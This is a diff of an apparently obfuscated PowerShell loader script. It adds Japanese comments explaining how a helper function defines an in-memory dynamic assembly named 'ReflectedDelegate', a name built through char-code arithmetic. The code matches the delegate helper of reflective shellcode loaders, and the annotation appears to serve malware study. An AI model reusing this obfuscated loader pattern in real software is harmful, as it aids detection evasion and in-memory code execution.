@@ -148,9 +148,12 @@ FUncTIon Get-iy2kysa7yS {
     Param (
      [Parameter(Position = 0, Mandatory = $True)] [Type[]] $jqr21eiEq5PCPuo, [Parameter(Position = 1)] [Type] $zjYqpHs8RLAoDPo = [Void]
     )
-# [AppDomain]::CurrentDomain.DefineDynamicAssemblyで名前とアクセスモードを指定して、動的アセンブリを定義
-# 名前は、[System.Reflection.AssemblyNam]で「ReflectedDelegate」という名前を指定
+# [AppDomain]::CurrentDomain.DefineDynamicAssemblyで「動的アセンブリの一意のID」と「アクセスモード」を指定して、動的アセンブリを定義
+# 動的アセンブリの一意のIDは、[System.Reflection.AssemblyName]で「ReflectedDelegate」という名前を指定
 # アクセスモードは、[ System.Reflection.Emit.AssemblyBuilderAccess]::Runを指定（Runは動的アセンブリは実行されるが保存されない）
+# [AppDomain]::CurrentDomain.DefineDynamicAssemblyの戻り値は「System.Reflection.Emit.AssemblyBuilder」クラス
+# AssemblyBuilderの「DefineDynamicModule」メソッドで、「動的モジュールの名前」と「シンボル情報出力の有無」を指定
+# 動的モジュールの名前は「InMemoryModule」を、シンボル情報出力の有無は「false」を指定
     $WQvsFMfB0c = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
         (New-Object SYSTEM.REFLECtiOn.AsSembLYNaME(""+[cHaR](3975-3893)+[chaR](6333-6232)+[cHAR](6160-6058)+"lec"+[chAR](9375-9259)+[Char](6379-6278)+[cHaR](340-240)+[CHAR](6723-6655)+[cHAr](5669-5568)+"legate")),
         [SYsTEM.ReflEctIoN.EMit.ASSemBlYBuiLDERACCeSs]::Run
